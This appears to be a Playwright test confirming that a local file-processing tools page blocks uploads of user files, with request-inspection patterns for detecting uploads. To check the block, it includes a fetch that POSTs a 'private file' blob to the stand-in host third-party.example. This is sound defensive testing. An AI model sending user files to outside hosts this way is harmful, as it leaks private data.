import { expect, test } from "@playwright/test";

test("local processing page does not upload user files while ads and download authorization stay isolated", async ({ page }) => {
  const fileUploadRequests: string[] = [];
  const allowedNetworkRequests: string[] = [];

  page.on("request", async (request) => {
    const method = request.method();
    const url = request.url();
    const postDataBuffer = request.postDataBuffer();
    const contentType = request.headers()["content-type"] || "";
    const looksLikeUserFileUpload =
      method !== "GET" &&
      Boolean(postDataBuffer?.byteLength) &&
      (/multipart\/form-data|application\/pdf|image\/|video\/|audio\/|officedocument|octet-stream/i.test(contentType) ||
        /upload|ocr|convert|process/i.test(url));

    if (looksLikeUserFileUpload) fileUploadRequests.push(url);
    if (/googlesyndication|baidu|cloudbase|createDownloadUrl/i.test(url)) allowedNetworkRequests.push(url);
  });

  await page.goto("/tools/");
  await expect(page.getByText("文件本地处理").first()).toBeVisible();

  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://third-party.example/upload", {
        method: "POST",
        body: new Blob(["private file"], { type: "application/pdf" })
      });
      return false;
    } catch (error) {
      return error instanceof Error && error.message.includes("隐私保护已拦截");
    }
  });

  expect(blocked).toBe(true);
  expect(fileUploadRequests).toEqual([]);
  expect(allowedNetworkRequests.every((url) => !/private|sample|blob:/i.test(url))).toBe(true);
});
